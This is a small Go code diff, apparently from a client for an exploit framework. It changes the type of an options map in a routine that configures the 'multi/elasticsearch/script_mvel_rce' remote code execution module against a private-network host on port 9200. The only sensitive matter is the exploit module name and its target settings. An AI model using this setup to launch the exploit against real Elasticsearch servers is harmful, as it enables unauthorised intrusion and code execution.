@@ -49,7 +49,7 @@ func main() {
 	log.Printf("Target acquired... ElasticSearch...\n")
 	moduleType := "exploit"
 	moduleName := "multi/elasticsearch/script_mvel_rce"
-	moduleOptions := map[string]string{
+	moduleOptions := map[string]interface{}{
 		"RHOSTS":      "192.168.1.131",
 		"RPORT":       "9200",
 		"SSL":         "false",
